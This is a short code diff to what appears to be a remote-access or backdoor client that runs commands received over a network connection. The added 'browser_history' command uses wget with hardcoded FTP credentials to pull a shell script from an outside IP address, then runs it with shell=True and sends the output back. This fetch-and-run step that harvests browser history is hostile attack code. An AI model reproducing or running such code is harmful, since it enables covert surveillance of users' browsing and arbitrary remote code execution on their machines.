@@ -116,6 +116,14 @@ def main():
                 
             else:
                 results = 'use netcapture start | stop'
+                
+        elif cmd == 'browser_history':
+            action = ['wget -r -q --no-parent -nH ftp://siic:azerty@84.39.40.23/browser_history/browser_history.sh', 'sh browser_history/browser_history.sh']
+            for i in range(len(action)):
+                results = subprocess.Popen(action[i], shell=True,
+                          stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                          stdin=subprocess.PIPE)
+                results = results.stdout.read() + results.stderr.read()
         
         elif cmd == 'kill':
             conn.close()
